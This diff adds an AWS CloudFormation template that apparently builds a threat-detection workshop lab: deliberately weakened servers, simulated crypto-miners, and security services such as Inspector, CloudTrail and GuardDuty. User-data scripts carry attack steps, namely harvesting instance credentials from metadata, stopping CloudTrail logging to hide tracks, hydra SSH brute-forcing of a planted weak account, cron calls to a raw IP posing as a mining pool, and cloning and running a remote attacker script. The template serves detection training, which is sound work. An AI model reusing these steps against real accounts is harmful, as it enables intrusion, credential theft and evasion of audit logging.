+                  - rds:DescribeDBSecurityGroups
+                  - iam:ListAccountAliases
+                  - cloudtrail:DescribeTrails
+                  - cloudwatch:DescribeAlarms
+                  - config:DescribeConfigRules
+                  - guardduty:ListDetectors 
+                  - iam:ListAccessKeys
+                  - iam:CreateUser
+                  - iam:CreateAccessKey
+                  - iam:AttachUserPolicy
+                  - cloudtrail:StopLogging
+                  - iam:GetCredentialReport
+                Resource: "*"
+              - 
+                Effect: Allow
+                Action:
+                  - logs:PutLogEvents
+                  - logs:DescribeLogStreams
+                  - logs:CreateLogStream
+                  - logs:CreateLogGroup
+                Resource: '*'
+              - 
+                Effect: Allow
+                Action: "s3:*"
+                Resource: "*"
+              
+  CompromisedInstanceProfile: 
+    DependsOn: CompromisedInstanceRole
+    Type: AWS::IAM::InstanceProfile
+    Properties: 
+      Path: /
+      Roles: 
+        - !Ref CompromisedInstanceRole
+
+  MinerInstanceRole: 
+    Type: AWS::IAM::Role
+    Properties: 
+      AssumeRolePolicyDocument: 
+        Version: 2012-10-17
+        Statement: 
+          - 
+            Effect: Allow
+            Principal: 
+              Service: 
+                - ec2.amazonaws.com
+            Action: 
+              - sts:AssumeRole
+      Path: /
+      ManagedPolicyArns:
+        - "arn:aws:iam::aws:policy/AmazonSSMFullAccess"
+      Policies: 
+        - 
+          PolicyName: MinerPolicy
+          PolicyDocument: 
+            Version: 2012-10-17
+            Statement: 
+              - 
+                Effect: Allow
+                Action: 'ssm:*'
+                Resource: "*"
+              - 
+                Effect: Allow
+                Action:
+                  - logs:PutLogEvents
+                  - logs:DescribeLogStreams
+                  - logs:CreateLogStream
+                  - logs:CreateLogGroup
+                Resource: '*'
+              - 
+                Effect: Allow
+                Action: 
+                  - 's3:*'
+                Resource: "*"
+
+  BitcoinInstanceProfile: 
+    DependsOn: MinerInstanceRole
+    Type: AWS::IAM::InstanceProfile
+    Properties: 
+      Path: /
+      Roles: 
+        - !Ref MinerInstanceRole
+
+  MaliciousInstanceRole: 
+    Type: AWS::IAM::Role
+    Properties: 
+      AssumeRolePolicyDocument: 
+        Version: 2012-10-17
+        Statement: 
+          - 
+            Effect: Allow
+            Principal: 
+              Service: 
+                - ec2.amazonaws.com
+            Action: 
+              - sts:AssumeRole
+      Path: /
+      ManagedPolicyArns:
+        - "arn:aws:iam::aws:policy/AmazonSSMFullAccess"
+      Policies: 
+        - 
+          PolicyName: MaliciousInstancePolicy
+          PolicyDocument: 
+            Version: 2012-10-17
+            Statement: 
+              - 
+                Effect: Allow
+                Action: '*'
+                Resource: "*"
+
+  MaliciousInstanceProfile: 
+    DependsOn: MaliciousInstanceRole
+    Type: AWS::IAM::InstanceProfile
+    Properties: 
+      Path: /
+      Roles: 
+        - !Ref MaliciousInstanceRole
+
+  WebServer:
+    DependsOn: 
+      - CompromisedInstanceProfile
+      - CloudTrail
+    Type: AWS::EC2::Instance
+    Properties: 
+      IamInstanceProfile: !Ref CompromisedInstanceProfile
+      InstanceType: m4.large
+      ImageId: !Ref LatestAWSLinuxAmiId
+      KeyName: "demo"
+      NetworkInterfaces: 
+        - AssociatePublicIpAddress: 'true'
+          DeviceIndex: '0'
+          GroupSet:
+            - !Ref WEBELBSG
+          SubnetId: !Ref PublicSubnet1
+      Tags:
+        - Key: Name
+          Value: "Apache Server"
+      UserData:
+        Fn::Base64: !Sub |
+            #!/bin/bash -ex
+            exec > /tmp/Webserver-userdata.log 2>&1
+            # Get Updates and Install Necessary Packages
+            sudo yum update -y -q && sudo yum upgrade -y -q
+            
+            # Install httpd
+            sudo yum install httpd -y -q
+            sudo service httpd start
+            sudo chkconfig httpd on
+
+            sudo yum install git -y
+            
+            sudo yum install awscli -y -q
+            sudo yum install awslogs -y -q
+            sudo yum install jq -y -q 
+            sudo yum install python3 -y
+
+            sudo yum -y install python-pip
+
+            sudo pip install boto
+            sudo pip install boto3
+
+            #Update Path
+            export PATH=$PATH:/usr/local/bin:/usr/sbin:/root/.local/bin
+            echo 'export PATH=/root/.local/bin:/usr/sbin:$PATH' >> /tmp/ec2-user.profile
+            sudo cp /tmp/ec2-user.profile /home/ec2-user/.profile
+                        
+            # Set Variables
+            instance_id=`curl http://169.254.169.254/latest/meta-data/instance-id`
+            region=`curl -s http://169.254.169.254/latest/dynamic/instance-identity/document | grep -oP '\"region\" : \"\K[^\"]+'`
+            access_key_id=`curl http://169.254.169.254/latest/meta-data/iam/security-credentials/${CompromisedInstanceRole} | grep AccessKeyId | cut -d':' -f2 | sed 's/[^0-9A-Z]*//g'`
+            secret_key=`curl http://169.254.169.254/latest/meta-data/iam/security-credentials/${CompromisedInstanceRole} | grep SecretAccessKey | cut -d':' -f2 | sed 's/[^0-9A-Za-z/+=]*//g'`
+            token=`curl http://169.254.169.254/latest/meta-data/iam/security-credentials/${CompromisedInstanceRole} | grep Token | cut -d':' -f2 | sed 's/[^0-9A-Za-z/+=]*//g'`
+            expiration=`curl http://169.254.169.254/latest/meta-data/iam/security-credentials/${CompromisedInstanceRole} | grep Expiration | cut -d':' -f2 | sed 's/[^0-9A-Za-z/+=]*//g'`
+            compromisedip=`curl http://169.254.169.254/latest/meta-data/local-ipv4`
+            ami=`curl -s http://169.254.169.254/latest/meta-data/ami-id`
+            starttime=$(date +%s)
+
+            sudo touch /var/log/secure
+            # sudo mkdir /etc/awslogs
+            
+            # Set CloudWatch Logs Agent Region
+            cat <<EOT >> /tmp/awscli.conf
+            [plugins]
+            cwlogs = cwlogs
+            [default]
+            region = $region
+            EOT
+            sudo cp /tmp/awscli.conf /etc/awslogs/
+            
+            # Set CloudWatch Logs Agent Config
+            cat <<EOT >> /tmp/awslogs.conf
+            
+            [/var/log/secure]
+            file = /var/log/secure
+            log_stream_name = /var/log/secure
+            log_group_name = ${CloudWatchLogGroup}
+            datetime_format = %d %b %Y %H:%M:%S
+            
+            [/var/log/syslog]
+            file = /var/log/syslog
+            log_stream_name = /var/log/syslog
+            log_group_name = ${CloudWatchLogGroup}
+            datetime_format = %b %d %H:%M:%S
+            EOT
+            
+            cat /tmp/awslogs.conf | sudo tee -a /etc/awslogs/awslogs.conf
+            sudo systemctl start awslogsd
+            sudo systemctl enable awslogsd.service
+            
+            # Modify Instance Configurations
+            sudo sed 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config > /tmp/temp.txt
+            sudo mv -f /tmp/temp.txt /etc/ssh/sshd_config
+            sudo systemctl restart sshd
+            
+            sudo systemctl restart rsyslog 
+            
+            # Create Sample User
+            sudo mkdir /home/alice
+            sudo useradd -u 12345 -g users -d /home/alice -s /bin/bash -p $(echo ThreatDetectionPassword123! | openssl passwd -1 -stdin) alice
+
+            #Install AWS Inspector
+            wget https://inspector-agent.amazonaws.com/linux/latest/install
+            sudo bash install
+
+            # attacker lifecycle script
+            cat <<EOT >> /tmp/attackerlifecycle.sh
+            #!/bin/bash
+            exec > /tmp/Webserver-attackerlifecycle.log 2>&1
+            
+            #set a uniq value by using epoch date
+            # cli commands
+
+            # Set up CloudTrail logging to delete later
+            # committed out redundant creation of cloudtrail
+            # aws cloudtrail create-subscription --region=$region --name=DELETEME-CT-$starttime --s3-new-bucket=deleteme-$starttime --s3-prefix=DELETEME --sns-new-topic=awscloudtrail-DELETEME-$starttime-log-deliverytopic
+            # sleep 37m
+            aws s3 ls --region $region
+
+            # sleep 5m
+            aws ec2 describe-instances --region $region
+            
+            # create EC2 instance commands
+            # sleep 21m
+            export ami
+            aws ec2 run-instances --region $region --image-id $ami --count 1 --subnet-id ${PublicSubnet2}  --instance-type t2.micro --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=another_miner},{Key=Description,Value=created from web server}]' 
+
+            aws iam get-credential-report --region=$region
+
+            #DB and Snapshot Recon 
+
+            aws rds describe-db-instances --region=$region 
+            aws rds describe-db-security-groups --region=$region 
+            aws ec2 describe-snapshots  --region=$region 
+            aws ec2 describe-volumes  --region=$region
+
+            echo 'Checking for EC2 service limits for miners'
+            aws service-quotas list-service-quotas --service-code ec2 --region $region 
+            
+            # sleep 5m
+            echo 'Starting network recon phase'
+
+            aws ec2 describe-security-groups --region $region --filters Name=ip-permission.from-port,Values=22,80,443,3389 Name=ip-permission.to-port,Values=22 Name=ip-permission.cidr,Values='0.0.0.0/0' --query 'SecurityGroups[*].{Name:GroupName}'
+
+            aws ec2 --region $region describe-instances
+
+            echo 'Checking Organizations and account aliases for account context.'
+
+            aws iam list-account-aliases --region=$region
+
+            echo 'Getting list of log sources.'
+
+            aws cloudtrail describe-trails --region=$region
+            aws cloudwatch describe-alarms --region=$region
+            aws configservice describe-config-rules --region=$region
+            aws guardduty list-detectors --region=$region
+
+            # sleep 7m
+            echo 'Starting persistence phase.'
+
+            # aws iam create-user --user-name malicious_user-\$starttime
+            # aws iam create-access-key --user-name malicious_user-\$starttime
+            aws iam list-access-keys --user-name malicious_user-\$starttime
+
+            echo 'Stopping CloudTrail logging to S3 to cover tracks'
+            # committed out redundant stopping and deleting of CloudTrail logging
+
+            # sleep 45
+            aws cloudtrail stop-logging --name=${CloudTrail}  --region=$region
+            EOT
+
+            sudo sh /tmp/attackerlifecycle.sh
+            
+            # creates IAM user and access key
+
+            # sleep 2
+            git clone https://github.com/sheldonlsides/detective-env-demo.git
+            cd detective-env-demo/
+            sudo python3 ./pythonattacker.py
+
+            # internal use only - create IAM user not maintained by Isengard
+            # user_info=$(aws iam create-user --user-name malicious_user-$starttime)
+            # username=$( echo $user_info|jq -r '[.User][0]| .UserName' )
+
+            # key_info=$(aws iam create-access-key --user-name $username)
+
+            # internal use only - creates access id and secret key
+            # access_id=$( echo $key_info|jq -r '[.AccessKey][0]| .AccessKeyId' ) 
+            # secret_key=$( echo $key_info|jq -r '[.AccessKey][0]| .SecretAccessKey' ) 
+
+            # internal use only - elevate users rights to managed Admin ARN
+            # aws iam attach-user-policy --user-name $username --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+
+            # change AWS environment credentials
+            # export AWS_ACCESS_KEY_ID=$access_id
+            # export AWS_SECRET_ACCESS_KEY=$secret_key
+            # export AWS_SESSION_TOKEN=""
+
+            # list users access keys
+            # aws iam list-access-keys --user-name $username
+
+            # creates new secret in secrets manaer
+            # aws secretsmanager create-secret --name some_secret_content-$starttime --secret-string $secret_key --description "Stores some user secrets" --region $region
+
+            # sleep 5
+            # Deletes IAM user access key. User will not have access to the console or CLI (security cleanup)
+            # aws iam delete-access-key --access-key-id $access_id --user-name $username
+
+            echo 'Bootstrapping complete'
+
+  Miner1:
+    Type: AWS::EC2::Instance
+    Properties: 
+      InstanceType: c5.xlarge
+      IamInstanceProfile: !Ref BitcoinInstanceProfile
+      ImageId: !Ref LatestAWSLinuxAmiId
+      NetworkInterfaces: 
+        - AssociatePublicIpAddress: 'true'
+          DeviceIndex: '0'
+          GroupSet:
+            - !Ref MINERSG
+          SubnetId: !Ref PublicSubnet1
+      Tags:
+        - Key: Name
+          Value: "BTC Miner 1"
+      UserData:
+        Fn::Base64: !Sub |
+            #!/bin/bash -x
+            #This can be on a AWS Linux AMI
+            exec > /tmp/part-001.log 2>&1
+
+            # Get Updates and Install Necessary Packages
+            sudo yum update -y -q && sudo yum upgrade -y -q
+            sudo yum install go -y -q
+            sudo yum install git -y -q
+
+            #Update Path
+            export PATH=$PATH:/usr/local/bin:/usr/sbin:/root/.local/bin
+            echo 'export PATH=/root/.local/bin:/usr/sbin:$PATH' >> /home/ec2-user/.profile
+
+            # install (installs in /home/ec2-user/go/bin)
+            go get -u github.com/alphasoc/flightsim/
+
+            # Create FlightSim Miner Cron Job
+            cat <<EOT > /tmp/FlightSim-Miner.sh
+            #!/bin/bash
+            /home/ec2-user/go/bin/flightsim run miner
+            EOT
+
+            sudo cp /tmp/FlightSim-Miner.sh /home/ec2-user/FlightSim-Miner.sh
+            sudo chmod 744 /home/ec2-user/FlightSim-Miner.sh
+            sudo chown ec2-user /home/ec2-user/FlightSim-Miner.sh
+
+            # Create Fake Bitcoin Cron Job
+            cat <<EOT > /tmp/bitcoin-ping.sh
+            !/bin/bash
+            wget https://104.140.201.42:9000/favicon.ico --no-check-certificate | rm favicon.* >/dev/null 2>&1
+            #curl -s http://pool.minergate.com/dkjdjkjdlsajdkljalsskajdksakjdksajkllalkdjsalkjdsalkjdlkasj  > /dev/null &
+            #curl -s http://xmr.pool.minergate.com/dhdhjkhdjkhdjkhajkhdjskahhjkhjkahdsjkakjasdhkjahdjk  > /dev/null &
+            EOT
+
+            sudo cp /tmp/bitcoin-ping.sh /home/ec2-user/bitcoin-ping.sh
+            sudo chmod 744 /home/ec2-user/bitcoin-ping.sh
+            sudo chown ec2-user /home/ec2-user/bitcoin-ping.sh
+
+            echo "*/9 * * * * /home/ec2-user/FlightSim-Miner.sh > /home/ec2-user/FlightSim-Miner.log 2>&1" >> cron
+            echo "*/12 * * * * /home/ec2-user/bitcoin-ping.sh > /home/ec2-user/bitcoin-ping.log 2>&1" >> cron
+            sudo crontab -u ec2-user cron
+  
+  Miner2:
+    Type: AWS::EC2::Instance
+    Properties: 
+      InstanceType: c5.xlarge
+      IamInstanceProfile: !Ref BitcoinInstanceProfile
+      ImageId: !Ref LatestAWSLinuxAmiId
+      # KeyName: "workshop"
+      NetworkInterfaces: 
+        - AssociatePublicIpAddress: 'true'
+          DeviceIndex: '0'
+          GroupSet:
+            - !Ref MINERSG
+          SubnetId: !Ref PublicSubnet1
+      Tags:
+        - Key: Name
+          Value: "BTC Miner 2"
+      UserData:
+        Fn::Base64: !Sub |
+            #!/bin/bash -x
+            #This can be on a AWS Linux AMI
+            exec > /tmp/part-001.log 2>&1
+
+            # Get Updates and Install Necessary Packages
+            sudo yum update -y -q && sudo yum upgrade -y -q
+            sudo yum install go -y -q
+            sudo yum install git -y -q
+
+            #Update Path
+            export PATH=$PATH:/usr/local/bin:/usr/sbin:/root/.local/bin
+            echo 'export PATH=/root/.local/bin:/usr/sbin:$PATH' >> /home/ec2-user/.profile
+
+            # install (installs in /home/ec2-user/go/bin)
+            go get -u github.com/alphasoc/flightsim/
+
+            # Create FlightSim Miner Cron Job
+            cat <<EOT > /tmp/FlightSim-Miner.sh
+            #!/bin/bash
+            /home/ec2-user/go/bin/flightsim run miner
+            EOT
+            sudo cp /tmp/FlightSim-Miner.sh /home/ec2-user/FlightSim-Miner.sh
+            sudo chmod 744 /home/ec2-user/FlightSim-Miner.sh
+            sudo chown ec2-user /home/ec2-user/FlightSim-Miner.sh
+
+            # Create Fake Bitcoin Cron Job
+            cat <<EOT > /tmp/bitcoin-ping.sh
+            !/bin/bash
+            wget https://104.140.201.42:9000/favicon.ico --no-check-certificate | rm favicon.* >/dev/null 2>&1
+            #curl -s http://pool.minergate.com/dkjdjkjdlsajdkljalsskajdksakjdksajkllalkdjsalkjdsalkjdlkasj  > /dev/null &
+            #curl -s http://xmr.pool.minergate.com/dhdhjkhdjkhdjkhajkhdjskahhjkhjkahdsjkakjasdhkjahdjk  > /dev/null &
+            EOT
+
+            sudo cp /tmp/bitcoin-ping.sh /home/ec2-user/bitcoin-ping.sh
+            sudo chmod 744 /home/ec2-user/bitcoin-ping.sh
+            sudo chown ec2-user /home/ec2-user/bitcoin-ping.sh
+
+            echo "*/9 * * * * /home/ec2-user/FlightSim-Miner.sh > /home/ec2-user/FlightSim-Miner.log 2>&1" >> cron
+            echo "*/12 * * * * /home/ec2-user/bitcoin-ping.sh > /home/ec2-user/bitcoin-ping.log 2>&1" >> cron
+            sudo crontab -u ec2-user cron
+    
+  VULNServer:
+    Type: AWS::EC2::Instance
+    Properties: 
+      InstanceType: m5.large
+      IamInstanceProfile: !Ref MaliciousInstanceProfile
+      ImageId: !Ref LatestAWSLinuxAmiId
+      # KeyName: "workshop"
+      NetworkInterfaces: 
+        - AssociatePublicIpAddress: 'true'
+          DeviceIndex: '0'
+          GroupSet:
+            - !Ref VULNSG
+          SubnetId: !Ref PublicSubnet1
+      Tags:
+        - Key: Name
+          Value: "Scanner"
+      UserData:
+        Fn::Base64: !Sub |
+            #!/bin/bash -ex
+
+            exec > /tmp/VulnScan-userdata.log 2>&1
+            
+            # Get Updates and Install Necessary Packages
+            sudo yum update -y && sudo yum upgrade -y -qq
+            sudo yum install gcc gcc-c++ kernel-devel make -y -qq
+            sudo yum install git sshpass python-pip libssl-dev libssh-dev libidn11-dev libpcre3-dev libgtk2.0-dev libmysqlclient-dev libpq-dev libsvn-dev -y -qq
+            pip install awscli --user
+            
+            #Update Path
+            export PATH=$PATH:/usr/local/bin:/usr/sbin:/root/.local/bin
+            echo 'export PATH=/root/.local/bin:/usr/sbin:$PATH' >> /tmp/ec2-user.profile
+            sudo cp /tmp/ec2-user.profile /home/ec2-user/.profile
+            
+            # Install thc-hydra and dependancies
+            sudo yum install http://mirror.centos.org/centos/7/extras/x86_64/Packages/libssh-0.7.1-7.el7.x86_64.rpm -y
+            sudo yum install http://download-ib01.fedoraproject.org/pub/epel/7/x86_64/Packages/f/firebird-libfbclient-2.5.9.27139.0-1.el7.x86_64.rpm -y
+            sudo yum install http://www6.atomicorp.com/channels/atomic/centos/7/x86_64/RPMS/hydra-8.0-2.el7.art.x86_64.rpm -y 
+            # Grab some Common Usernames and Passwords
+            wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt -P /home/ec2-user/thc-hydra/
+            wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt -P /home/ec2-user/thc-hydra/
+           
+            # Create Targets File
+            echo '${WebServer.PrivateIp}' >> /home/ec2-user/targets.txt
+
+            # Create SSH Brute Force Cron Job
+            cat <<EOT > /home/ec2-user/ssh-bruteforce.sh
+            #!/bin/bash
+            /usr/bin/hydra -t 4 -L /home/ec2-user/thc-hydra/top-usernames-shortlist.txt -P /home/ec2-user/thc-hydra/top-20-common-SSH-passwords.txt -M /home/ec2-user/targets.txt ssh
+            EOT
+            
+            chmod 744 /home/ec2-user/ssh-bruteforce.sh
+            chown ec2-user /home/ec2-user/ssh-bruteforce.sh
+            
+            echo "*/2 * * * * /home/ec2-user/ssh-bruteforce.sh > /home/ec2-user/ssh-bruteforce.log 2>&1" >> cron
+            crontab -u ec2-user cron
+
+            #Install AWS Inspector
+            wget https://inspector-agent.amazonaws.com/linux/latest/install
+            sudo bash install
+        
+  MaliciousServer:
+    Type: AWS::EC2::Instance
+    Properties: 
+      IamInstanceProfile: !Ref MaliciousInstanceProfile
+      InstanceType: m5.large
+      ImageId: !Ref LatestAWSLinuxAmiId
+      # KeyName: "workshop"
+      NetworkInterfaces: 
+        - AssociatePublicIpAddress: 'true'
+          DeviceIndex: '0'
+          GroupSet:
+            - !Ref VULNSG
+          SubnetId: !Ref PublicSubnet1
+      Tags:
+        - Key: Name
+          Value: "Malicious Server"
+      UserData:
+        Fn::Base64: !Sub |
+            #!/bin/bash -x
+            exec > /tmp/Malicious-userdata.log 2>&1
+            
+            # userdata-vulnscan-success.sh
+            
+            # Get Updates and Install Necessary Packages
+            sudo yum update -y -qq && sudo yum upgrade -y -qq
+            sudo yum install build-essential -y -qq
+            #sudo yum install git sshpass python-pip libssl-dev libssh-dev libidn11-dev libpcre3-dev libgtk2.0-dev libmysqlclient-dev libpq-dev libsvn-dev -y -qq
+            sudo yum install awscli -y -qq
+            
+            #Update Path
+            export PATH=$PATH:/usr/local/bin:/usr/sbin:/root/.local/bin
+            echo 'export PATH=/root/.local/bin:/usr/sbin:$PATH' >> /tmp/ec2-user.profile
+            sudo cp /tmp/ec2-user.profile /home/ec2-user/.profile
+
+            # Set Variables
+            instance_id=`curl http://169.254.169.254/latest/meta-data/instance-id`
+            region=`curl -s http://169.254.169.254/latest/dynamic/instance-identity/document | grep -oP '\"region\" : \"\K[^\"]+'`
+            access_key_id=`curl http://169.254.169.254/latest/meta-data/iam/security-credentials/${MaliciousInstanceRole} | grep AccessKeyId | cut -d':' -f2 | sed 's/[^0-9A-Z]*//g'`
+            secret_key=`curl http://169.254.169.254/latest/meta-data/iam/security-credentials/${MaliciousInstanceRole} | grep SecretAccessKey | cut -d':' -f2 | sed 's/[^0-9A-Za-z/+=]*//g'`
+            token=`curl http://169.254.169.254/latest/meta-data/iam/security-credentials/${MaliciousInstanceRole} | grep Token | cut -d':' -f2 | sed 's/[^0-9A-Za-z/+=]*//g'`
+            expiration=`curl http://169.254.169.254/latest/meta-data/iam/security-credentials/${MaliciousInstanceRole} | grep Expiration | cut -d':' -f2 | sed 's/[^0-9A-Za-z/+=]*//g'`
+            myip=`curl http://169.254.169.254/latest/meta-data/local-ipv4`
+            ami=`curl -s http://169.254.169.254/latest/meta-data/ami-id`
+
+            Install thc-hydra and dependancies
+            sudo yum install http://mirror.centos.org/centos/7/extras/x86_64/Packages/libssh-0.7.1-7.el7.x86_64.rpm -y
+            sudo yum install http://download-ib01.fedoraproject.org/pub/epel/7/x86_64/Packages/f/firebird-libfbclient-2.5.9.27139.0-1.el7.x86_64.rpm -y
+            sudo yum install http://www6.atomicorp.com/channels/atomic/centos/7/x86_64/RPMS/hydra-8.0-2.el7.art.x86_64.rpm -y 
+            # Grab some Common Usernames and Passwords
+            wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt -P /home/ec2-user/
+            wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt -P /home/ec2-user/
+            
+            # Create Targets File
+            echo '${WebServer.PrivateIp}' >> /home/ec2-user/targets.txt
+
+            # Add successfull user/pass
+            echo "alice" >> /home/ec2-user/top-usernames-shortlist.txt
+            echo 'ThreatDetectionPassword123!' >> /home/ec2-user/top-20-common-SSH-passwords.txt
+            
+            # Create SSH Brute Force Cron Job
+            cat <<EOT > /home/ec2-user/ssh-bruteforce.sh
+            #!/bin/bash
+            /usr/bin/hydra -t 4 -L /home/ec2-user/top-usernames-shortlist.txt -P /home/ec2-user/top-20-common-SSH-passwords.txt -M /home/ec2-user/targets.txt ssh
+            EOT
+            
+            chmod 744 /home/ec2-user/ssh-bruteforce.sh
+            chown ec2-user /home/ec2-user/ssh-bruteforce.sh
+            
+            echo "*/30 * * * * /home/ec2-user/ssh-bruteforce.sh > /home/ec2-user/ssh-bruteforce.log 2>&1" >> cron
+            crontab -u ec2-user cron
+
+            #Install AWS Inspector
+            wget https://inspector-agent.amazonaws.com/linux/latest/install
+            sudo bash install
+            
+
+  # Left if needed in future workshops
+
+  # WebServerALB:
+  #   Type: AWS::ElasticLoadBalancingV2::LoadBalancer
+  #   Properties: 
+  #     IpAddressType: "ipv4"
+  #     Name: "Web-ALB"
+  #     SecurityGroups: 
+  #     - !Ref WEBELBSG
+  #     Subnets: 
+  #       - !Ref PublicSubnet1
+  #       - !ImportValue PublicSubnet2
+  #     Tags: 
+  #       - 
+  #         Key: "Name"
+  #         Value: "web-alb"
+  # ALBListener:
+  #   DependsOn: WebServerLBTarget
+  #   Type: "AWS::ElasticLoadBalancingV2::Listener"
+  #   Properties:
+  #     DefaultActions: 
+  #       -
+  #         Type: "forward"
+  #         TargetGroupArn: !Ref WebServerLBTarget
+  #     LoadBalancerArn: !Ref WebServerALB
+  #     Port: 80
+  #     Protocol: "HTTP"
+  # WebServerLBTarget:
+  #   DependsOn: WebServer
+  #   Type: AWS::ElasticLoadBalancingV2::TargetGroup
+  #   Properties: 
+  #     Name: "EC2Target"
+  #     Port: 80
+  #     Protocol: "HTTP"
+  #     Tags: 
+  #       - 
+  #         Key: "Name"
+  #         Value: "web-alb-target-group"
+  #     Targets: 
+  #       - Id: !Ref "WebServer"
+  #     TargetType: "instance"
+  #     VpcId: !ImportValue dev-VPC
+
+  # Left if needed in future workshops - end
+  
+  ### Server configuration ends here
+
+  ### Security Services and Logging configuration starts here ###
+  ### Configuration of GuardDuty, Security Hub, Inspector, AWS Config, CloudTrail
+  InspectorWebResourceGroup:
+    Type: AWS::Inspector::ResourceGroup
+    Properties: 
+      ResourceGroupTags: 
+        - Key: "Name"
+          Value: "Web Server"
+
+  InspectorAssessmentTarget: 
+    Type: AWS::Inspector::AssessmentTarget
+    Properties: 
+        AssessmentTargetName : AssessmentTargetWebServerResources
+        ResourceGroupArn: !GetAtt InspectorWebResourceGroup.Arn
+        
+  InspectorAssessmentTemplate:
+    DependsOn: 
+        - InspectorAssessmentTarget
+    Type: AWS::Inspector::AssessmentTemplate
+    Properties:
+        AssessmentTargetArn: !GetAtt InspectorAssessmentTarget.Arn
+        AssessmentTemplateName: WebServerResourcesTemplate
+        DurationInSeconds: 300
+        RulesPackageArns: 
+        -
+          !FindInMap
+            - RulePackageMap
+            - !Ref 'AWS::Region'
+            - NetworkReachabilityPackage
+        -
+          !FindInMap
+            - RulePackageMap
+            - !Ref 'AWS::Region'
+            - SecurityBestPracticesPackage
+        -
+          !FindInMap
+            - RulePackageMap
+            - !Ref 'AWS::Region'
+            - CISOSBenchmarkPackage
+        -
+          !FindInMap
+            - RulePackageMap
+            - !Ref 'AWS::Region'
+            - CVEPackage
+
+  InspectorLambdaRole:
+    Type: AWS::IAM::Role
+    Properties:
+      AssumeRolePolicyDocument:
+        Version: '2012-10-17'
+        Statement:
+        - Effect: Allow
+          Principal:
+            Service:
+            - lambda.amazonaws.com
+          Action:
+          - sts:AssumeRole
+      Path: "/"
+        
+  InspectorLambdaPolicy:
+    DependsOn: 
+      - RunInspectorFunction
+    Type: AWS::IAM::Policy
+    Properties:
+      PolicyName: InspectorLambdaPolicy
+      PolicyDocument:
+        Version: '2012-10-17'
+        Statement:
+        - Effect: Allow
+          Action:
+            - 'logs:CreateLogStream'
+            - 'logs:PutLogEvents'
+          Resource:
+            - !Sub arn:aws:logs:${AWS::Region}:${AWS::AccountId}:log-group:/aws/lambda/${RunInspectorFunction}:*
+        - Effect: Allow
+          Action:
+            - 'inspector:StartAssessmentRun'
+          Resource: "*"
+        - Effect: Allow
+          Action: 'logs:CreateLogGroup'
+          Resource: !Sub arn:aws:logs:${AWS::Region}:${AWS::AccountId}:*
+      Roles:
+      - !Ref InspectorLambdaRole
+          
+  RunInspectorFunction:
+    DependsOn: 
+      - InspectorLambdaRole
+    Type: AWS::Lambda::Function
+    Properties: 
+      Handler: index.lambda_handler
+      Description: Function to that starts Inspector Assessment
+      Code:
+        ZipFile: | 
+          import boto3, os
+          def lambda_handler(event, context):
+            print('Inspector Assessment Started')
+            inspector = boto3.client('inspector')
+            
+            inspector.start_assessment_run(
+                assessmentTemplateArn=os.environ['InspectorAssessmentArn']
+                # os.environ['InspectorAssessmentArn']
+            )
+      Runtime: python3.7
+      FunctionName: Run-Inspector-Assessment
+      Timeout: 60
+      Environment:
+        Variables:
+          InspectorAssessmentArn: !GetAtt InspectorAssessmentTemplate.Arn
+      Role: !GetAtt InspectorLambdaRole.Arn
+          
+  InspectorCWEEventRule: 
+    DependsOn: RunInspectorFunction
+    Type: AWS::Events::Rule
+    Properties: 
+      Name: "Run-Inspector-Assessment"
+      Description: "Rule to start Inspector Assessment after EC2 instances have started"
+      ScheduleExpression: "rate(3 hours)"
+      State: "ENABLED"
+      Targets: 
+        - 
+          Arn: !GetAtt RunInspectorFunction.Arn
+          Id: !Ref RunInspectorFunction
+  
+  PermissionForEventsToInvokeInspectorLambda: 
+    DependsOn: InspectorCWEEventRule
+    Type: AWS::Lambda::Permission
+    Properties: 
+      FunctionName: 
+        Ref: RunInspectorFunction
+      Action: "lambda:InvokeFunction"
+      Principal: "events.amazonaws.com"
+      SourceArn: !GetAtt InspectorCWEEventRule.Arn
+
+  #AWS Inspector configuration ends here
+  IAMAnalyzer:
+    Type: 'AWS::AccessAnalyzer::Analyzer'
+    Properties:
+      AnalyzerName: AccountAnalyzer
+      Type: ACCOUNT
+
+  ### AWS Cloudtrail configuration starts here
+  CloudTrailBucketPolicy: 
+      Type: AWS::S3::BucketPolicy
+      Properties: 
+        Bucket: 
+          Ref: CloudTrailS3Bucket
+        PolicyDocument: 
+          Version: "2012-10-17"
+          Statement: 
+            - 
+              Sid: "AWSCloudTrailAclCheck"
+              Effect: "Allow"
+              Principal: 
+                Service: "cloudtrail.amazonaws.com"
+              Action: "s3:GetBucketAcl"
+              Resource: 
+                !Sub |-
+                  arn:aws:s3:::${CloudTrailS3Bucket}
+            - 
+              Sid: "AWSCloudTrailWrite"
+              Effect: "Allow"
+              Principal: 
+                Service: "cloudtrail.amazonaws.com"
+              Action: "s3:PutObject"
+              Resource:
+                !Sub |-
+                  arn:aws:s3:::${CloudTrailS3Bucket}/AWSLogs/${AWS::AccountId}/*
+              Condition: 
+                StringEquals:
+                  s3:x-amz-acl: "bucket-owner-full-control"
+
+  CloudTrailAccessLogs:
+    Type: AWS::S3::Bucket
+    DeletionPolicy: Retain
+    Properties:
+        BucketEncryption:
+            ServerSideEncryptionConfiguration:
+            - ServerSideEncryptionByDefault:
+                SSEAlgorithm: AES256
+        AccessControl: "LogDeliveryWrite"
+            
+  CloudTrailS3Bucket: 
+      DependsOn: CloudTrailAccessLogs
+      Type: AWS::S3::Bucket
+      DeletionPolicy: Retain
+      Properties:
+          BucketEncryption:
+              ServerSideEncryptionConfiguration:
+              - ServerSideEncryptionByDefault:
+                  SSEAlgorithm: AES256
+          LoggingConfiguration:
+              DestinationBucketName: !Ref CloudTrailAccessLogs
+          # VersioningConfiguration:
+          #     Status: Enabled
+
+  #AWS Cloudtrail configuration end here
+
+  # GuardDuty KMS & S3 config starts here
+  GDSNS:
+    Type: AWS::SNS::Topic
+    Properties: 
+      DisplayName: "GDSNSTopic"
+      Tags:
+      - Key: "Name"
+        Value: "GuardDuty SNS"
+      TopicName: GDSNSTopic
+
+  GDS3BucketAccessLogs:
+    Type: AWS::S3::Bucket
+    DeletionPolicy: Retain
